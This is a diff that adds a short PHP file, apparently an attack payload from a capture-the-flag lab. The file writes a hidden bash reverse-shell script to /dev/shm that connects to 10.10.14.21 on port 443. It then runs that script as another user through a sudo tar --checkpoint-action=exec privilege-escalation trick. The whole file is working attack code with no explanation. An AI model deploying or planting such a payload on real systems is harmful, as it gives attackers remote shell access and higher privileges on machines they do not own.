@@ -1,0 +1,4 @@
+<?php
+	system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.21/443 0>&1' > /dev/shm/.test.sh");
+	system("cd / && sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/.test.sh\"");
+?>
